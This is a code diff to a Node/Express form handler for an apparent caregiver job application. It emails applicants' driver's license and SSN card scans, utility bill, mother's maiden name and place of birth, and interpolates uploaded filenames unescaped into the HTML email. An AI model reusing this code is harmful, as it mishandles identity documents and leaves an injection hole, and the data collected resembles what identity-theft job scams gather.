@@ -39,6 +39,13 @@ const uploadFields = [
   { name: 'utilityBill', maxCount: 1 },
 ];
 
+const fileLabelByField = {
+  idFront: "Driver's License/State ID FRONT",
+  idBack: "Driver's License/State ID BACK",
+  ssnCard: 'SSN Card',
+  utilityBill: 'Utility Bill',
+};
+
 const getTransporter = () => {
   const { SMTP_HOST, SMTP_PORT, SMTP_SECURE, SMTP_USER, SMTP_PASS } = process.env;
 
@@ -94,6 +101,15 @@ app.post('/api/form-submit', upload.fields(uploadFields), async (req, res) => {
     const mailTo = process.env.MAIL_TO || process.env.SMTP_USER;
     const mailFrom = process.env.MAIL_FROM || process.env.SMTP_USER;
 
+    const uploadedFileDetails = uploadFields.map(({ name }) => {
+      const file = req.files?.[name]?.[0];
+      return {
+        key: name,
+        label: fileLabelByField[name] || name,
+        originalname: file?.originalname || 'Not uploaded',
+      };
+    });
+
     const textBody = [
       'New Jovie Caregiver Application',
       '',
@@ -109,8 +125,15 @@ app.post('/api/form-submit', upload.fields(uploadFields), async (req, res) => {
       `Mother\'s Maiden Name: ${motherMaidenName}`,
       `Place of Birth: ${birthPlace}`,
       '',
+      'Uploaded Files:',
+      ...uploadedFileDetails.map((file) => `${file.label}: ${file.originalname}`),
+      '',
       `Submitted At: ${new Date().toISOString()}`,
     ].join('\n');
+
+    const uploadedFilesHtml = uploadedFileDetails
+      .map((file) => `<li><strong>${file.label}:</strong> ${file.originalname}</li>`)
+      .join('');
 
     const htmlBody = `
       <h2>New Jovie Caregiver Application</h2>
@@ -125,6 +148,8 @@ app.post('/api/form-submit', upload.fields(uploadFields), async (req, res) => {
       <p><strong>Mother's Name:</strong> ${motherName}</p>
       <p><strong>Mother's Maiden Name:</strong> ${motherMaidenName}</p>
       <p><strong>Place of Birth:</strong> ${birthPlace}</p>
+      <p><strong>Uploaded Files:</strong></p>
+      <ul>${uploadedFilesHtml}</ul>
       <p><strong>Submitted At:</strong> ${new Date().toISOString()}</p>
     `;
 
